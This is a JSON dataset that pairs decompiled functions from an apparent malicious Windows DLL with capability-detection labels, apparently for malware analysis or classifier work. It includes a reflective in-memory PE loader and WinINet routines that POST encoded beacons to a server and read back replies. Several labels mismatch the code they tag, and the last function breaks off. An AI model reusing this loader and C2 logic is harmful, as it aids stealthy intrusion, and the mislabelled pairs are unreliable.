{
    "18000117": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180001170(int64_t arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int64_t arg1_00;\n    uint64_t arg3;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint64_t arg3_00;\n    uchar auStack200 [32];\n    uint32_t *puStack168;\n    uint32_t auStack152 [4];\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uint uStack72;\n    ushort uStack68;\n    uint64_t uStack56;\n    \n    uStack56 = *0x18001f010 ^ auStack200;\n    auStack152[0] = 0x46;\n    uVar1 = *arg2;\n    auStack136 = ZEXT816(0);\n    auStack120 = ZEXT816(0);\n    uVar7 = 0;\n    auStack104 = ZEXT816(0);\n    uStack72 = 0;\n    uStack68 = 0;\n    auStack88 = ZEXT816(0);\n    iVar4 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n    if (iVar4 != 0) {\n        uVar6 = *arg2;\n        uVar9 = 0;\n        if (uVar6 / 0x30 != 0xffffffff) {\n            iVar8 = 0;\n            do {\n                if ((uVar9 == uVar6 / 0x30) && (uVar6 % 0x30 == 0)) break;\n                auStack152[0] = 0x46;\n                puStack168 = auStack152;\n                uVar2 = 0x30;\n                if (uVar6 - iVar8 < 0x30) {\n                    uVar2 = uVar6 - iVar8;\n                }\n                iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(iVar8 + arg1, uVar2, 1, auStack136);\n                if (iVar3 == 0) {\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(iVar4);\n                    goto code_r0x000180001334;\n                }\n                uVar6 = 0x40;\n                if (auStack152[0] < 0x40) {\n                    uVar6 = auStack152[0];\n                }\n                arg3_00 = uVar6;\n                arg3 = ((uVar1 / 3) * 4 + 0x68) - uVar7;\n                arg1_00 = uVar7 + iVar4;\n                auStack152[0] = uVar6;\n                if (arg3_00 != 0) {\n                    if (arg1_00 == 0) {\n                        puVar5 = fcn.18000528c();\n                        *puVar5 = 0x16;\n                    }\n                    else {\n                        if (arg3_00 <= arg3) {\n                            fcn.180004b80(arg1_00, auStack136, arg3_00);\n                            goto code_r0x0001800012e2;\n                        }\n                        fcn.180004300(arg1_00, 0, arg3);\n                        puVar5 = fcn.18000528c();\n                        *puVar5 = 0x22;\n                    }\n                    fcn.18000516c();\n                }\ncode_r0x0001800012e2:\n                uVar6 = *arg2;\n                uVar7 = uVar7 + auStack152[0];\n                uVar9 = uVar9 + 1;\n                iVar8 = iVar8 + 0x30;\n            } while (uVar9 < uVar6 / 0x30 + 1);\n        }\n        if (*((uVar7 - 1) + iVar4) == '\\n') {\n            uVar1 = uVar7 - 2;\n            if (*(uVar1 + iVar4) == '\\r') {\n                *((uVar7 - 1) + iVar4) = 0;\n                *(uVar1 + iVar4) = 0;\n                uVar7 = uVar1;\n            }\n        }\n        *arg2 = uVar7;\n    }\ncode_r0x000180001334:\n    fcn.1800030c0(uStack56 ^ auStack200);\n    return;\n}\n",
        "token_count": 1006
    },
    "18000205": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180002050(int16_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    int64_t *arg1_00;\n    int64_t iVar7;\n    code *pcVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    int32_t *piVar13;\n    uint64_t uVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    uchar auStack88 [32];\n    int64_t iStack56;\n    uint64_t uStack48;\n    \n    uStack48 = *0x18001f010 ^ auStack88;\n    if (((*arg1 != 0x5a4d) || (piVar13 = *(arg1 + 0x1e) + arg1,  *piVar13 != 0x4550)) ||\n       ((iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(*(piVar13 + 0xc), piVar13[0x14], 0x2000),  iVar5 == 0 &&\n        (iStack56 = iVar5,  iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, piVar13[0x14], 0x2000),  iStack56 = iVar5, \n        iVar5 == 0)))) goto code_r0x0001800023ea;\n    iStack56 = iVar5;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    arg1_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6, 0, 0x20);\n    uVar12 = 0;\n    arg1_00[1] = iVar5;\n    arg1_00[3] = 0;\n    arg1_00[2] = 0;\n    (*_sym.imp.KERNEL32.dll_VirtualAlloc)(iVar5, piVar13[0x14], 0x1000);\n    iVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(iVar5, piVar13[0x15]);\n    fcn.180004b80(iVar7, arg1, piVar13[0x15] + *(arg1 + 0x1e));\n    iVar4 = *(arg1 + 0x1e);\n    *arg1_00 = iVar4 + iVar7;\n    *(iVar4 + iVar7 + 0x30) = iVar5;\n    iVar5 = *arg1_00;\n    iVar7 = arg1_00[1];\n    if (*(iVar5 + 6) != 0) {\n        puVar15 = *(iVar5 + 0x14) + 0x28 + iVar5;\n        uVar14 = uVar12;\n        do {\n            if (*puVar15 == 0) {\n                iVar4 = piVar13[0xe];\n                if (0 < iVar4) {\n                    uVar6 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(puVar15[-1] + iVar7, iVar4, 0x1000);\n                    puVar15[-2] = uVar6;\n                    fcn.180004300(uVar6, 0, iVar4);\n                }\n            }\n            else {\n                uVar6 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(puVar15[-1] + iVar7);\n                fcn.180004b80(uVar6, puVar15[1] + arg1, *puVar15);\n                puVar15[-2] = uVar6;\n            }\n            iVar5 = *arg1_00;\n            uVar16 = uVar14 + 1;\n            uVar14 = uVar16;\n            puVar15 = puVar15 + 10;\n        } while (uVar16 < *(iVar5 + 6));\n    }\n    iVar7 = iStack56;\n    iVar11 = iStack56 - *(piVar13 + 0xc);\n    if ((iVar11 != 0) && (*(iVar5 + 0xb4) != 0)) {\n        iVar2 = arg1_00[1];\n        puVar15 = *(iVar5 + 0xb0) + iVar2;\n        uVar16 = *puVar15;\n        while (uVar16 != 0) {\n            uVar9 = puVar15[1];\n            puVar10 = puVar15 + 2;\n            iVar5 = uVar16 + iVar2;\n            uVar14 = uVar12;\n            if ((uVar9 - 8 & 0xfffffffffffffffe) != 0) {\n                do {\n                    uVar3 = *puVar10 >> 0xc;\n                    uVar9 = *puVar10 & 0xfff;\n                    if (uVar3 == 3) {\n                        piVar13 = uVar9 + iVar5;\n                        *piVar13 = *piVar13 + iVar11;\n                    }\n                    else if (uVar3 == 10) {\n                        piVar1 = uVar9 + iVar5;\n                        *piVar1 = *piVar1 + iVar11;\n                    }\n                    uVar9 = puVar15[1];\n                    uVar14 = uVar14 + 1;\n                    puVar10 = puVar10 + 2;\n                } while (uVar14 < uVar9 - 8 >> 1);\n            }\n            puVar15 = puVar15 + uVar9;\n            uVar16 = *puVar15;\n        }\n    }\n    iVar4 = fcn.180001ed0(arg1_00);\n    if (iVar4 != 0) {\n        iVar5 = *arg1_00;\n        uVar14 = *(iVar5 + 0x30) & 0xffffffff00000000;\n        if (*(iVar5 + 6) != 0) {\n            piVar13 = *(iVar5 + 0x14) + 0x28 + iVar5;\n            uVar9 = uVar12;\n            do {\n                uVar16 = piVar13[5];\n                iVar4 = *piVar13;\n                if ((uVar16 >> 0x19 & 1) == 0) {\n                    if (iVar4 == 0) {\n                        if ((uVar16 & 0x40) == 0) {\n                            if (-1 < uVar16) goto code_r0x000180002394;\n                            iVar4 = *(iVar5 + 0x24);\n                        }\n                        else {\n                            iVar4 = *(iVar5 + 0x20);\n                        }\n                        if (iVar4 == 0) goto code_r0x000180002394;\n                    }\n                    (*_sym.imp.KERNEL32.dll_VirtualProtect)(piVar13[-2] | uVar14, iVar4);\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar13[-2] | uVar14);\n                }\ncode_r0x000180002394:\n                iVar5 = *arg1_00;\n                uVar16 = uVar9 + 1;\n                uVar9 = uVar16;\n                piVar13 = piVar13 + 10;\n            } while (uVar16 < *(iVar5 + 6));\n        }\n        if (*(iVar5 + 0x28) == 0) goto code_r0x0001800023ea;\n        pcVar8 = *(iVar5 + 0x28) + iVar7;\n        if ((pcVar8 != NULL) && (iVar4 = (*pcVar8)(iVar7, 1, 0x180022410),  iVar4 != 0)) {\n            *(arg1_00 + 0x1c) = 1;\n            goto code_r0x0001800023ea;\n        }\n    }\n    if (*(arg1_00 + 0x1c) != 0) {\n        (*(*(*arg1_00 + 0x28) + arg1_00[1]))(arg1_00[1], 0, 0);\n        *(arg1_00 + 0x1c) = 0;\n    }\n    iVar5 = arg1_00[2];\n    if (iVar5 != 0) {\n        uVar14 = uVar12;\n        if (0 < *(arg1_00 + 3)) {\n            do {\n                iVar5 = arg1_00[2];\n                if (*(uVar12 + iVar5) != -1) {\n                    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(uVar12 + iVar5));\n                    iVar5 = arg1_00[2];\n                }\n                uVar16 = uVar14 + 1;\n                uVar12 = uVar12 + 8;\n                uVar14 = uVar16;\n            } while (uVar16 < *(arg1_00 + 3));\n        }\n        fcn.180006a84(iVar5);\n    }\n    if (arg1_00[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(arg1_00[1], 0, 0x8000);\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6, 0, arg1_00);\ncode_r0x0001800023ea:\n    fcn.1800030c0(uStack48 ^ auStack88);\n    return;\n}\n",
        "token_count": 2102
    },
    "18000252": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.180002520(uint64_t arg1, int64_t arg2, uint32_t *arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t arg1_01;\n    ulong arg1_02;\n    uint *puVar3;\n    int64_t arg2_00;\n    uint64_t arg3_00;\n    uint64_t arg3_01;\n    uint64_t uStackX8;\n    \n    iVar1 = (*arg3 / 3) * 4;\n    uStackX8 = arg1;\n    arg1_01 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40);\n    if (arg1_01 == 0) {\n        return 0;\n    }\n    fcn.180001380(arg1_01, iVar1 + 0x8a, \"param=%08x%08x%08x\", *0x18001fc54);\n    if ((arg2 == 0) || (*arg3 == 0)) {\n        *arg3 = 0x1e;\n        return arg1_01;\n    }\n    arg1_02 = (*_sym.imp.KERNEL32.dll_GetTickCount64)();\n    fcn.1800052d8(arg1_02);\n    iVar2 = fcn.1800052ac();\n    fcn.180001380(arg1_01 + 0x1e, iVar1 + 0x6c, \"%04x\", iVar2 % 0xffff);\n    arg3_00 = *arg3;\n    arg1_00 = arg1_01 + 0x22;\n    arg3_01 = iVar1 + 0x68;\n    if (arg3_00 != 0) {\n        if (arg1_00 == 0) {\n            puVar3 = fcn.18000528c();\n            *puVar3 = 0x16;\n        }\n        else {\n            if (arg3_00 <= arg3_01) {\n                fcn.180004b80(arg1_00, arg2, arg3_00);\n                goto code_r0x000180002649;\n            }\n            fcn.180004300(arg1_00, 0, arg3_01);\n            puVar3 = fcn.18000528c();\n            *puVar3 = 0x22;\n        }\n        fcn.18000516c();\n    }\ncode_r0x000180002649:\n    if (arg4 != 0) {\n        fcn.180001010(arg1_00, *arg3, 0x18001fa24, 0x20);\n    }\n    uStackX8 = uStackX8 & 0xffffffff00000000 | *arg3;\n    arg2_00 = fcn.180001170(arg1_00, &uStackX8);\n    if (arg2_00 == 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(arg1_01);\n        return 0;\n    }\n    if (uStackX8 != 0) {\n        if (arg1_00 == 0) {\n            puVar3 = fcn.18000528c();\n            *puVar3 = 0x16;\n        }\n        else {\n            if ((uStackX8 & 0xffffffff) <= arg3_01) {\n                fcn.180004b80(arg1_00, arg2_00, uStackX8 & 0xffffffff);\n                *arg3 = uStackX8 + 0x22;\n                (*_sym.imp.KERNEL32.dll_LocalFree)(arg2_00);\n                return arg1_01;\n            }\n            fcn.180004300(arg1_00, 0, arg3_01);\n            puVar3 = fcn.18000528c();\n            *puVar3 = 0x22;\n        }\n        fcn.18000516c();\n    }\n    *arg3 = uStackX8 + 0x22;\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg2_00);\n    return arg1_01;\n}\n",
        "token_count": 918
    },
    "180002d3": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid fcn.180002d30(ulong noname_0, ulong noname_1, ulong arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong arg_60h, ulong arg_68h)\n\n{\n    int64_t arg1;\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint64_t arg3_00;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uchar auStack152 [32];\n    uint32_t *puStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uint32_t auStack88 [2];\n    int32_t iStack80;\n    uint uStack76;\n    uint64_t uStack72;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    uint64_t uVar8;\n    \n    uStack72 = *0x18001f010 ^ auStack152;\n    auStack88[0] = arg3;\n    iVar3 = fcn.180002520(noname_0, noname_1, auStack88, noname_5);\n    uVar5 = auStack88[0];\n    if (iVar3 == 0) goto code_r0x000180003038;\n    arg3_00 = 0;\n    uVar7 = 0;\n    uVar8 = arg3_00;\n    do {\n        iVar1 = fcn.180002720(noname_0, iVar3, uVar5);\n        if (iVar1 != 0) break;\n        uVar6 = uVar8 + 1;\n        uVar8 = uVar6;\n    } while (uVar6 < 3);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(iVar3);\n    if (*0x18001fa18 == 0) goto code_r0x000180003038;\n    iStack80 = 0;\n    uStack76 = 0;\n    iVar1 = (*_sym.imp.WININET.dll_HttpEndRequestW)(*0x18001fa18, 0, 8);\n    if (iVar1 != 0) {\n        auStack88[0] = 4;\n        puStack120 = NULL;\n        iVar1 = (*_sym.imp.WININET.dll_HttpQueryInfoA)(*0x18001fa18, 0x20000013, &iStack80, auStack88);\n        if ((iVar1 != 0) && (iStack80 == 200)) {\n            auStack88[0] = 4;\n            puStack120 = NULL;\n            iVar1 = (*_sym.imp.WININET.dll_HttpQueryInfoA)(*0x18001fa18, 0x20000005, &uStack76, auStack88);\n            if (iVar1 != 0) {\n                if ((arg4 == 0) || (noname_4 == 0)) goto code_r0x000180003038;\n                iVar1 = (noname_4 / 3) * 4;\n                iVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40);\n                if (iVar3 == 0) goto code_r0x000180003038;\n                auStack88[0] = 0;\n                iStack80 = 0;\n                if (iVar1 != -0x68) {\n                    iVar2 = (*_sym.imp.WININET.dll_InternetQueryDataAvailable)(*0x18001fa18, auStack88, 0, 0);\n                    uVar8 = arg3_00;\n                    while ((iVar2 != 0 && (uVar7 = uVar8,  auStack88[0] != 0))) {\n                        if (iVar1 + 0x68U < uVar7 + auStack88[0]) {\n                            (*_sym.imp.WININET.dll_InternetCloseHandle)(*0x18001fa18);\n                            *0x18001fa18 = 0;\n                            goto code_r0x000180002f8f;\n                        }\n                        (*_sym.imp.WININET.dll_InternetReadFile)(*0x18001fa18, uVar8 + iVar3, auStack88[0], &iStack80);\n                        uVar7 = uVar7 + iStack80;\n                        uVar8 = uVar7;\n                        auStack88[0] = 0;\n                        iVar2 = (*_sym.imp.WININET.dll_InternetQueryDataAvailable)(*0x18001fa18, auStack88, 0, 0);\n                    }\n                }\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(*0x18001fa18);\n                *0x18001fa18 = 0;\n                if (uVar7 == 0) {\ncode_r0x000180002f8f:\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(iVar3);\n                }\n                else {\n                    if (4 < uVar7) {\n                        auStack88[0] = uVar7 - 4;\n                        uStack104 = 0;\n                        arg1 = iVar3 + 4;\n                        uStack112 = 0;\n                        puStack120 = auStack88;\n                        iVar1 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(arg1, auStack88[0], 1, arg1);\n                        if (iVar1 != 0) {\n                            if (noname_5 != 0) {\n                                fcn.180001010(arg1, auStack88[0], 0x18001fa24, 0x20);\n                            }\n                            uVar5 = auStack88[0];\n                            if (auStack88[0] != 0) {\n                                if (arg1 == 0) {\n                                    fcn.180004300(iVar3, 0, auStack88[0]);\n                                    puVar4 = fcn.18000528c();\n                                    *puVar4 = 0x16;\n                                    fcn.18000516c();\n                                    uVar5 = auStack88[0];\n                                }\n                                else {\n                                    fcn.180004b80(iVar3, arg1, auStack88[0]);\n                                }\n                            }\n                            *(uVar5 + iVar3) = 0;\n                            *(auStack88[0] + 1 + iVar3) = 0;\n                            arg3_00 = auStack88[0];\n                            if (noname_4 < auStack88[0]) goto code_r0x000180002f8f;\n                        }\n                    }\n                    if (arg3_00 != 0) {\n                        if (arg3_00 <= noname_4) {\n                            fcn.180004b80(arg4, iVar3, arg3_00);\n                            (*_sym.imp.KERNEL32.dll_LocalFree)(iVar3);\n                            goto code_r0x000180003038;\n                        }\n                        fcn.180004300(arg4, 0, noname_4);\n                        puVar4 = fcn.18000528c();\n                        *puVar4 = 0x22;\n                        fcn.18000516c();\n                    }\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(iVar3);\n                }\n                goto code_r0x000180003038;\n            }\n        }\n    }\n    (*_sym.imp.WININET.dll_InternetCloseHandle)(*0x18001fa18);\n    *0x18001fa18 = 0;\ncode_r0x000180003038:\n    fcn.1800030c0(uStack72 ^ auStack152);\n    return;\n}\n",
        "token_count": 1734
    },
    "180005fb": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t fcn.180005fbc(int64_t arg1)\n\n{\n    int32_t *arg4;\n    int64_t arg1_00;\n    char cVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    ulong uVar5;\n    ushort *arg2;\n    uchar uVar6;\n    uint32_t uVar7;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    cVar1 = *(arg1 + 0x41);\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    uVar6 = 0x78;\n    if (cVar1 < 'e') {\n        if (cVar1 == 'd') {\ncode_r0x0001800060af:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001800060b3:\n            uVar5 = 10;\ncode_r0x0001800060bb:\n            uVar4 = fcn.180006590(arg1, uVar5);\n        }\n        else {\n            if (cVar1 == 'A') goto code_r0x0001800060c2;\n            if (cVar1 == 'C') {\ncode_r0x00018000602d:\n                uVar4 = fcn.1800064c8(arg1);\n            }\n            else {\n                if (cVar1 < 'E') goto code_r0x0001800060cb;\n                if (cVar1 < 'H') goto code_r0x0001800060c2;\n                if (cVar1 == 'S') {\ncode_r0x00018000606b:\n                    uVar4 = fcn.180006798(arg1);\n                }\n                else {\n                    if (cVar1 == 'X') goto code_r0x000180006080;\n                    if (cVar1 != 'Z') {\n                        if (cVar1 != 'a') {\n                            if (cVar1 != 'c') goto code_r0x0001800060cb;\n                            goto code_r0x00018000602d;\n                        }\n                        goto code_r0x0001800060c2;\n                    }\n                    uVar4 = fcn.180006298(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < cVar1) {\n            if (cVar1 == 'i') goto code_r0x0001800060af;\n            if (cVar1 == 'n') {\n                uVar4 = fcn.180006710(arg1);\n                goto code_r0x0001800060c7;\n            }\n            if (cVar1 == 'o') {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar5 = 8;\n            }\n            else if (cVar1 == 'p') {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x000180006080:\n                uVar5 = 0x10;\n            }\n            else {\n                if (cVar1 == 's') goto code_r0x00018000606b;\n                if (cVar1 == 'u') goto code_r0x0001800060b3;\n                if (cVar1 != 'x') goto code_r0x0001800060cb;\n                uVar5 = 0x10;\n            }\n            goto code_r0x0001800060bb;\n        }\ncode_r0x0001800060c2:\n        uVar4 = fcn.18000630c(arg1);\n    }\ncode_r0x0001800060c7:\n    if (uVar4 == '\\0') {\ncode_r0x0001800060cb:\n        return uVar4 & 0xffffffffffffff00;\n    }\n    if (*(arg1 + 0x40) != '\\0') goto code_r0x000180006206;\n    uVar2 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) == 0) goto code_r0x000180006124;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x000180006124:\n    cVar1 = *(arg1 + 0x41);\n    if (((cVar1 + 0xa8U & 0xdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((cVar1 + 0xbfU & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((cVar1 == 'X') || (cVar1 == 'A')) {\n            uVar6 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar6;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar7 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.1800058e8(arg1_00, CONCAT71(uVar2 >> 8, 0x20), uVar7, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.18000690c(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.1800058e8(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar7, arg4);\n    }\n    uVar5 = 0;\n    uVar4 = fcn.180006830(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        uVar4 = fcn.1800058e8(arg1_00, CONCAT71(uVar5 >> 8, 0x20), uVar7, arg4);\n    }\ncode_r0x000180006206:\n    return uVar4 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 1640
    },
    "null": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "18000272": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180002720(ulong noname_0, int64_t arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar5;\n    int64_t iVar6;\n    uchar auStack696 [32];\n    ulong uStack664;\n    ulong uStack656;\n    uint uStack648;\n    ulong uStack640;\n    uint uStack632;\n    int32_t iStack628;\n    uint uStack624;\n    uchar auStack620 [16];\n    uchar auStack604 [16];\n    ulong uStack588;\n    uint32_t uStack580;\n    ulong uStack576;\n    int16_t aiStack568 [264];\n    uint64_t uStack40;\n    uint64_t uVar4;\n    \n    uStack40 = *0x18001f010 ^ auStack696;\n    uVar4 = 0;\n    uVar5 = 0;\n    uStack632 = 0;\n    fcn.180004300(aiStack568, 0, 0x208);\n    uStack588 = 0;\n    auStack620 = ZEXT816(0);\n    uStack576 = 0;\n    iStack628 = 0;\n    auStack604 = ZEXT816(0);\n    if (((*0x18001fa20 - 3U < 2) && (*0x18001fa08 != 0)) && (*0x18001fa10 != 0)) {\n        uStack640 = 0;\n        if (*0x18001fa20 == 4) {\n            uVar5 = 0x803000;\n        }\n        uStack656 = 0;\n        uStack664 = 0;\n        uStack648 = uVar5;\n        uStack632 = uVar5;\n        *0x18001fa18 = (*_sym.imp.WININET.dll_HttpOpenRequestW)(*0x18001fa10, L\"POST\", 0x18001fa44, 0);\n        if (*0x18001fa18 != 0) {\n            if (*0x18001fa20 == 4) {\n                uStack632 = 0x1f380;\n                (*_sym.imp.WININET.dll_InternetSetOptionW)(*0x18001fa18, 0x1f, &uStack632);\n            }\n            fcn.1800054f4(aiStack568, 0x104, L\"Content-Type: application/x-www-form-urlencoded\");\n            iVar6 = -1;\n            do {\n                iVar6 = iVar6 + 1;\n            } while (aiStack568[iVar6] != 0);\n            (*_sym.imp.WININET.dll_HttpAddRequestHeadersW)(*0x18001fa18, aiStack568, iVar6, 0x20000000);\n            uStack624 = 0x38;\n            uStack664 = 0;\n            uStack580 = arg3;\n            iVar1 = (*_sym.imp.WININET.dll_HttpSendRequestExW)(*0x18001fa18, &uStack624, 0, 8);\n            if (iVar1 == 0) {\ncode_r0x0001800028b7:\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(*0x18001fa18);\n                *0x18001fa18 = 0;\n            }\n            else if (arg3 != 0) {\n                do {\n                    uVar2 = arg3 - uVar4;\n                    uVar3 = 0xffff;\n                    if (uVar2 < 0xffff) {\n                        uVar3 = uVar2;\n                    }\n                    iVar1 = (*_sym.imp.WININET.dll_InternetWriteFile)(*0x18001fa18, uVar4 + arg2, uVar3, &iStack628);\n                    if (iVar1 == 0) goto code_r0x0001800028b7;\n                    uVar3 = uVar4 + iStack628;\n                    uVar4 = uVar3;\n                } while (uVar3 < arg3);\n            }\n            goto code_r0x00018000295c;\n        }\n    }\n    else if (*0x18001fa18 != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*0x18001fa18);\n        *0x18001fa18 = 0;\n    }\n    if (*0x18001fa10 != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)();\n        *0x18001fa10 = 0;\n    }\n    if (*0x18001fa08 != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)();\n        *0x18001fa08 = 0;\n    }\ncode_r0x00018000295c:\n    fcn.1800030c0(uStack40 ^ auStack696);\n    return;\n}\n",
        "token_count": 1069
    },
    "18000298": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180002980(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    ulong var_d0h;\n    ulong var_2e0h;\n    ulong var_4f0h;\n    uchar auStack1560 [32];\n    ushort *puStack1528;\n    uint32_t uStack1520;\n    uint uStack1512;\n    ulong uStack1504;\n    uchar auStack1496 [16];\n    uchar auStack1480 [16];\n    uchar auStack1464 [4];\n    uchar auStack1460 [12];\n    uchar auStack1448 [16];\n    uchar auStack1432 [16];\n    uchar auStack1416 [16];\n    ulong uStack1400;\n    uint uStack1384;\n    uint32_t auStack1380 [3];\n    char acStack1368 [272];\n    ushort auStack1096 [264];\n    uchar auStack568 [432];\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_60h;\n    ulong var_4ch;\n    ulong lpMultiByteStr;\n    uint64_t uStack40;\n    \n    uStack40 = *0x18001f010 ^ auStack1560;\n    auStack1380[0] = 0x104;\n    fcn.180004300(acStack1368, 0, 0x104);\n    fcn.180004300(auStack1096, 0, 0x208);\n    uStack1400 = 0;\n    auStack1496 = ZEXT816(0);\n    auStack1480 = ZEXT816(0);\n    _auStack1464 = ZEXT816(0);\n    auStack1448 = ZEXT816(0);\n    auStack1432 = ZEXT816(0);\n    auStack1416 = ZEXT816(0);\n    fcn.180004300(auStack568, 0, 0x208);\n    iVar7 = -1;\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (*(arg2 + iVar5 * 2) != 0);\n    if (iVar5 != 0) {\n        if (*0x18001fa18 != 0) {\n            (*_sym.imp.WININET.dll_InternetCloseHandle)();\n            *0x18001fa18 = 0;\n        }\n        if (*0x18001fa10 != 0) {\n            